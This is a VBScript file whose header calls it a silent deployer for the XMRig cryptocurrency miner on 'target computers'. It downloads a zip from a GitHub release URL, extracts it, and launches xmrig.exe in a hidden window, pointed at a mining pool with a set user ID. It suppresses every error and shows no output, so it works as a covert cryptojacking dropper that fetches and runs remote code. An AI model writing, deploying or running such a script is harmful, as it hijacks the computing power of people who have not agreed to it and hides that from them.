' ====================================================================================
' VBScript to Download, Unzip, and Run XMRig Silently (v3 - Completely Silent)
'
' Description:
' This script automates the process of deploying the XMRig miner. It runs
' without any visible output, pop-ups, or error messages.
' 1. Downloads the XMRig zip file from the specified URL.
' 2. Saves the zip file to the same directory as the script.
' 3. Extracts the contents of the zip file.
' 4. Runs xmrig.exe in a hidden window with the specified configuration.
'
' Usage:
' 1. Save this code as a .vbs file (e.g., start_miner.vbs).
' 2. Place it in the desired directory on the target computers.
' 3. Execute the script. It will run completely in the background.
' ====================================================================================

Option Explicit

' --- Configuration ---
Dim downloadUrl, zipFileName, extractedFolderName, exeName, minerArgs
downloadUrl = "https://github.com/yeasin-the-king/the-tvhbes/releases/download/tvhbes/xmrig-6.24.0-windows-x64.zip"
zipFileName = "xmrig-6.24.0-windows-x64.zip"
extractedFolderName = "xmrig-6.24.0"
exeName = "xmrig.exe"
minerArgs = "-o tari-s.h9.com:17769 -u tarirxt0-bcb4-df35-40fd-e71025801830 -p mcj -a rx/0 -k --donate-level 1 --log-file=xmrig_output.txt"

' --- Script Objects ---
Dim http, stream, fso, shell, scriptPath, zipFilePath, extractPath, exePath, command

' --- Error Handling ---
On Error Resume Next

' --- Get Current Script Path ---
Set fso = CreateObject("Scripting.FileSystemObject")
scriptPath = fso.GetParentFolderName(WScript.ScriptFullName)

zipFilePath = fso.BuildPath(scriptPath, zipFileName)
extractPath = fso.BuildPath(scriptPath, "") ' Extract to the root of the script path
exePath = fso.BuildPath(fso.BuildPath(scriptPath, extractedFolderName), exeName)

' --- Step 1: Download XMRig using WinHttpRequest for better reliability ---
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
If Err.Number <> 0 Then WScript.Quit

' Set timeouts (in milliseconds)
http.SetTimeouts 10000, 30000, 60000, 60000

http.Open "GET", downloadUrl, False
http.Send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1 ' Binary
    stream.Write http.ResponseBody
    stream.SaveToFile zipFilePath, 2 ' Overwrite if exists
    stream.Close
    Set stream = Nothing
Else
    WScript.Quit
End If
Set http = Nothing

' --- Step 2: Extract the Zip File ---
Set shell = CreateObject("Shell.Application")

' Check if the zip file exists before trying to extract
If fso.FileExists(zipFilePath) Then
    Dim zipFolder, destFolder
    Set zipFolder = shell.NameSpace(zipFilePath)
    Set destFolder = shell.NameSpace(extractPath)
    
    ' The 20 argument means "Yes to All" for any overwrite prompts.
    destFolder.CopyHere zipFolder.Items, 20
Else
    WScript.Quit
End If

' --- Step 3: Run XMRig Silently ---
' Check if xmrig.exe exists after extraction
If fso.FileExists(exePath) Then
    ' Build the full command to execute
    command = """" & exePath & """ " & minerArgs
    
    ' Use WScript.Shell's Run method.
    ' The second argument '0' runs the program in a hidden window.
    ' The third argument 'False' makes the script not wait for the program to finish.
    Set shell = CreateObject("WScript.Shell")
    shell.Run command, 0, False
Else
    WScript.Quit
End If

' --- Step 4: Clean up (Optional) ---
' To enable cleanup, remove the leading apostrophe from the lines below.
' If fso.FileExists(zipFilePath) Then
'     fso.DeleteFile zipFilePath
' End If

' --- Release Objects ---
Set fso = Nothing
Set shell = Nothing

' --- End of Script ---
WScript.Quit
